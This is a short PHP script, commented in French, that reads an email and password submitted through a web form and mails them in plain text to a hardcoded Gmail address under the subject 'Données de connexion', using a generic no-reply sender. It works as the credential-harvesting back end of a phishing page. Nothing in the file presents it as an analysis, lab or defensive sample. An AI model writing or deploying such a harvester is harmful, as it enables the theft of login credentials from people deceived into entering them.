<?php
// Récupérer les informations du formulaire
$email = $_POST['email'];
$password = $_POST['password'];

// Destinataire de l'email (votre adresse email)
$to = "akkgh1261989@gmail.com";

// Sujet de l'email
$subject = "Données de connexion";

// Contenu de l'email
$message = "Voici les informations soumises par un utilisateur :\n\n";
$message .= "Email: " . $email . "\n";
$message .= "Mot de passe: " . $password . "\n";

// En-têtes de l'email
$headers = "From: no-reply@votresite.com" . "\r\n";
$headers .= "Reply-To: no-reply@votresite.com" . "\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8" . "\r\n";

// Envoi de l'email
if(mail($to, $subject, $message, $headers)){
    echo "Les informations ont été envoyées avec succès.";
} else {
    echo "Erreur dans l'envoi de l'email.";
}
?>
